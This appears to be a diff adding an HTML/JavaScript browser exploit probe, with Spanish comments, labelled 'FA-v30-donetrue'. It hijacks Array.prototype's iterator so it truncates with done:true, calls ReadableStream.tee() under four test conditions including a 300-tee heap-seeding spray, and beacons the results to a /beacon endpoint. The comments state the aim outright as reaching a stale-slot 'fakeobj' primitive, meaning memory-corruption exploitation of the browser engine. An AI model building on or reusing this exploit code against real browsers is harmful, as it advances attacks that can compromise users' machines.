@@ -1,0 +1,79 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<title>FA-v30-donetrue — press-20: EL DISCRIMINADOR (done:true sin throw — ¿Mundo T o Mundo D?)</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v30-donetrue…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v30-donetrue — press-20. LA PREGUNTA DE $1:
+ * Todas las muertes hasta hoy fueron con THROW. Nadie probó done:true
+ * (truncación LIMPIA, sin excepción): el iterador dice "terminé" tras
+ * N yields y la conversión devuelve un vector CORTO normalmente.
+ *   Mundo T (árbol): tee hace at(1) sobre size==1 → CRASH controlado
+ *   Mundo D (shipped sin check): lee el slot CRUDO → si trae ceros o un
+ *   handle real → SOBREVIVE y devuelve un par → fakeobj-vía-stale VIVO
+ * Matriz: S1 control (full-fill, sobrevive) · S2 done:true tras 1 yield
+ * · S3 done:true tras 0 yields · S4 SELF-SEED (300 tees = branches reales
+ * del heap correcto) + done:true-at-1 (adopción de handle stale REAL).
+ * armed-N síncrono antes de cada una. Kit incluido. Máxima telemetría. */
+var RID="v30d"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V30-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v30-donetrue; dr="+dr+"; rt="+rt+"; W="+(typeof Worker));
+
+var OI=Array.prototype[Symbol.iterator];
+function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+function poiFull(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i<=t.length) return {value:t[i-1],done:false}; throw new Error("CTRL"); }};}; }
+/* done:true tras N yields — SIN throw (truncación limpia) */
+function poiDone(n){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i<=n && i<=t.length) return {value:t[i-1],done:false}; return {done:true}; }};}; }
+
+function probeTee(t){
+  if(!t) return "-";
+  var r="br0="+typeof t[0]+";br1="+typeof t[1];
+  try{ r+=";lk0="+String(t[0].locked)+";lk1="+String(t[1].locked); }catch(e){ r+=";lk=E"; }
+  try{ var rd=t[0].getReader(); r+=";rd0=ok"; rd.releaseLock(); }catch(e){ r+=";rd0=E:"+String((e&&e.message)||e).slice(0,26); }
+  try{ r+=";c0="+typeof t[0].cancel; }catch(e){ r+=";c0=E"; }
+  return r;
+}
+
+/* S1 — control: full-fill + throw (sobrevive, catchable) */
+bk("armed-1","control full-fill-throw");
+var s1="-";
+try{ poiFull(); new ReadableStream({}).tee(); s1="no-throw"; rst(); }
+catch(e){ rst(); s1="threw:"+String((e&&e.message)||e).slice(0,24); }
+bk("S1",s1);
+
+/* S2 — done:true tras 1 yield (size==1, SIN excepción) — EL DISCRIMINADOR */
+bk("armed-2","done:true tras 1 yield — T:crash-at(1) · D:sobrevive-con-slot-crudo");
+var s2="-";
+try{ poiDone(1); var t2=new ReadableStream({}).tee(); s2="★SOBREVIVIO|"+probeTee(t2); rst(); }
+catch(e){ rst(); s2="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S2",s2);
+
+/* S3 — done:true tras 0 yields (size==0) — T:crash-at(0) · D:par-de-crudos */
+bk("armed-3","done:true tras 0 yields — T:crash-at(0) · D:sobrevive");
+var s3="-";
+try{ rst(); poiDone(0); var t3=new ReadableStream({}).tee(); s3="★SOBREVIVIO|"+probeTee(t3); rst(); }
+catch(e){ rst(); s3="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S3",s3);
+
+/* S4 — SELF-SEED (300 tees = 600 branches reales del heap correcto) + done:true-at-1 */
+bk("armed-4","self-seed 300 tees + done:true-at-1 — adopción de handle stale");
+var SEEDS=[];
+try{ for(var k=0;k<300;k++){ SEEDS.push(new ReadableStream({}).tee()); } }catch(e){}
+bk("S4-seeded","tees="+SEEDS.length);
+var s4="-";
+try{ SEEDS=null; poiDone(1); var t4=new ReadableStream({}).tee(); s4="★SOBREVIVIO|"+probeTee(t4); rst(); }
+catch(e){ rst(); s4="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S4",s4);
+
+rst();
+clearInterval(HB);
+bk("Z","FA-v30-donetrue complete — main VIVA (Mundo D confirmado en alguna fila)");
+})();
+</script></body></html>
